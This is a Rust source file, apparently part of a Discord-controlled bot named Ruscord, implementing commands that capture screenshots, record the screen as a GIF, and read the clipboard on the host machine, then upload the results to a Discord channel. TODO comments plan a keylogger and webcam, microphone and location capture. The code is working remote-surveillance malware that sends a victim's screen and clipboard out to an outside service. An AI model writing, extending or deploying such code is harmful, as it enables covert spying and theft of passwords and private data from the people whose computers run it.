use std::{
	io::Cursor,
	sync::{Arc, Mutex},
	time::Duration,
};

use clipboard::ClipboardProvider;
use codecs::{
	gif::{GifEncoder, Repeat},
	jpeg::JpegEncoder,
};
use poise::serenity_prelude::*;
use xcap::{image::*, Monitor};

use crate::{commands::command_channel_check, reply_as_attachment, say, RuscordContext, RuscordResult};

#[poise::command(prefix_command, slash_command, check = command_channel_check, subcommands("capture", "record"))]
pub async fn screen(_ctx: RuscordContext<'_>) -> RuscordResult<()> { Ok(()) }

/// Take a screenshot of the current screen
#[poise::command(prefix_command, slash_command, check = screen_command_check)]
pub async fn capture(
	ctx: RuscordContext<'_>,
	#[description = "Monitor to capture from. Primary monitor by default"]
	#[autocomplete = "screen_index_autocomplete"]
	monitor: Option<usize>,
) -> RuscordResult<()> {
	ctx.defer().await?;

	// Monitor index is 1-index, so subtract the 1 to get the 0-index
	let m_index = monitor.map(|n| n - 1).unwrap_or(0);

	// SAFETY: This is safe because the data is set in the screen command check
	let screens = unsafe {
		let arc = ctx
			.invocation_data::<Arc<Mutex<Vec<Monitor>>>>()
			.await
			.unwrap_unchecked();
		Arc::clone(&arc)
	};
	let (screen_name, screen_buffer) = tokio::task::spawn_blocking(move || {
		let screens = screens.lock().unwrap();
		// If the monitor index is 0, use the primary monitor. Otherwise, use the index
		// provided
		let screen = if m_index == 0 {
			screens.iter().find(|screen| screen.is_primary()).unwrap_or(&screens[0])
		} else {
			&screens[m_index]
		};

		let buffer = screen.capture_image()?;
		let img = DynamicImage::ImageRgba8(buffer).to_rgb8();
		let mut buffer = Cursor::new(Vec::new());
		let encoder = JpegEncoder::new_with_quality(&mut buffer, 80);
		img.write_with_encoder(encoder)?;
		Ok::<_, crate::Error>((normalize_name(screen.name()), buffer.into_inner()))
	})
	.await
	.unwrap()?;

	let reply = poise::CreateReply::default()
		.reply(true)
		.attachment(CreateAttachment::bytes(
			screen_buffer,
			format!("screenshot_{}.jpg", screen_name),
		));
	ctx.send(reply).await?;

	Ok(())
}

/// Record the screen for a specified duration
// TODO: Review performance
#[poise::command(prefix_command, slash_command, check = screen_command_check)]
pub async fn record(
	ctx: RuscordContext<'_>,
	#[description = "Monitor to capture from. Primary monitor by default"]
	#[autocomplete = "screen_index_autocomplete"]
	monitor: Option<usize>,
	#[description = "Duration to record in seconds (min 5, max 60)"]
	#[min = 5]
	#[max = 60]
	duration: Option<u64>,
) -> RuscordResult<()> {
	ctx.defer().await?;
	let m_index = monitor.map(|n| n - 1).unwrap_or(0);

	let duration = duration.unwrap_or(30);
	// SAFETY: This is safe because the data is set in the screen command check
	let screens = unsafe {
		let arc = ctx.invocation_data::<SafeMonitorArray>().await.unwrap_unchecked();
		Arc::clone(&arc)
	};

	say!(ctx, "Recording for {} seconds...", duration);

	let (tx, rx) = tokio::sync::oneshot::channel();

	tokio::task::spawn_blocking(move || {
		let mut frames = Vec::new();

		let screens = screens.lock().unwrap();
		let screen = if m_index == 0 {
			screens.iter().find(|screen| screen.is_primary()).unwrap_or(&screens[0])
		} else {
			&screens[m_index]
		};

		for _ in 0..duration {
			if let Ok(image) = screen.capture_image() {
				frames.push(DynamicImage::ImageRgba8(image));
			}
			std::thread::sleep(Duration::from_secs(1));
		}
		tx.send(frames).unwrap();
	});

	let frames = rx.await.unwrap();
	say!(ctx, "Recording complete! Converting to GIF...");
	let (tx, rx) = tokio::sync::oneshot::channel();
	tokio::task::spawn_blocking(move || {
		let mut buffer = Vec::new();
		{
			let mut encoder = GifEncoder::new_with_speed(&mut buffer, 10);
			encoder.set_repeat(Repeat::Finite(0)).unwrap();

			for frame in frames {
				encoder
					.encode_frame(Frame::from_parts(
						frame.to_rgba8(),
						0,
						0,
						Delay::from_saturating_duration(Duration::from_secs(1)),
					))
					.unwrap();
			}
		}
		tx.send(buffer).unwrap();
	});

	let buffer = rx.await.unwrap();
	reply_as_attachment!(ctx, "screen_recording.gif", buffer: buffer);

	Ok(())
}

/// Get the current clipboard content
#[poise::command(prefix_command, slash_command, check = command_channel_check)]
pub async fn clipboard(ctx: RuscordContext<'_>) -> RuscordResult<()> {
	ctx.defer().await?;

	let mut clipboard =
		clipboard::ClipboardContext::new().map_err(|e| crate::Error::Clipboard(format!("{e}").into()))?;

	let content = clipboard
		.get_contents()
		.map_err(|e| crate::Error::Clipboard(format!("{e}").into()))?;

	if content.is_empty() {
		say!(ctx, "Clipboard is empty");
	} else {
		reply_as_attachment!(ctx, "clipboard.txt", buffer: content.as_bytes());
	}

	Ok(())
}

// TODO: keylogger
// TODO: webcam, record gif, record screenshot
// TODO: microphone, join voice channel
// TODO: location?

use utils::*;
mod utils {
	use super::*;
	/// Type alias for a safe monitor array
	pub(super) type SafeMonitorArray = Arc<Mutex<Vec<Monitor>>>;

	/// Normalize a monitor name
	pub(super) fn normalize_name(name: &str) -> String { name.replace(".", "").replace("\\", "") }

	/// Check if there are any screens to capture
	///
	/// If there are, this check adds the list to the invocation data. If not,
	/// it prevents the command from running and prints a message to the user.
	pub(super) async fn screen_command_check(ctx: RuscordContext<'_>) -> RuscordResult<bool> {
		let screens_result = tokio::task::spawn_blocking(Monitor::all).await.unwrap();

		match screens_result {
			Ok(screens) if screens.is_empty() => {
				say!(ctx, "No screens detected");
				ctx.set_invocation_data(Arc::new(Mutex::new(screens))).await;
			},
			Ok(screens) => ctx.set_invocation_data(Arc::new(Mutex::new(screens))).await,
			Err(why) => {
				debug!("Failed to get screens: {}", why);
				say!(ctx, "Failed to get screens");
				return Ok(false);
			},
		};
		Ok(true)
	}

	/// Autocomplete for screen index
	pub(super) async fn screen_index_autocomplete(
		_ctx: RuscordContext<'_>, _partial: &str,
	) -> impl Iterator<Item = AutocompleteChoice> {
		let screens_result = tokio::task::spawn_blocking(Monitor::all).await.unwrap().unwrap();

		let length = screens_result.len();
		let names = screens_result
			.iter()
			.map(|s| normalize_name(s.name()))
			.collect::<Vec<_>>();
		(1..=length).map(move |n| AutocompleteChoice::new(names[n - 1].as_str(), n))
	}
}
